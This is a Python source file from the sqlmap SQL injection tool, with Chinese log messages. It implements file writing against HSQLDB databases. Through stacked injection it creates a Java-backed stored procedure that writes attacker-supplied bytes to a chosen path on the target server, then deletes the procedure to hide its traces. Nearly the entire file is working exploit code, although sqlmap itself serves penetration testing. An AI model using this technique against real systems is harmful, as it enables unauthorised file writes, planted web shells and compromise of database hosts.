#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import randomStr
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import PLACE
from lib.request import inject
from lib.core.exception import SqlmapUnsupportedFeatureException
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def readFile(self, remoteFile):
        errMsg = "在 HSQLDB 上无法读取文件"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def stackedWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        func_name = randomStr()
        max_bytes = 1024 * 1024

        debugMsg = "创建 JLP 过程 '%s'" % func_name
        logger.debug(debugMsg)

        addFuncQuery = "CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) " % (func_name, max_bytes)
        addFuncQuery += "LANGUAGE JAVA DETERMINISTIC NO SQL "
        addFuncQuery += "EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
        inject.goStacked(addFuncQuery)

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "由于注入点在 GET 参数上,要写入的文件十六进制值为 %d " % fcEncodedStrLen
            warnMsg += "字节,这可能会导致文件写入过程中出现错误"
            logger.warning(warnMsg)

        debugMsg = "将 %s 文件内容导出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # 参考:http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_procedures
        invokeQuery = "CALL %s('%s', CAST('%s' AS VARBINARY(%s)))" % (func_name, remoteFile, fcEncodedStr, max_bytes)
        inject.goStacked(invokeQuery)

        logger.debug("清理数据库管理系统")

        delQuery = "DELETE PROCEDURE %s" % func_name
        inject.goStacked(delQuery)

        message = "本地文件 '%s' 已写入后端 DBMS" % localFile
        message += "文件系统中的文件 '%s'" % remoteFile
        logger.info(message)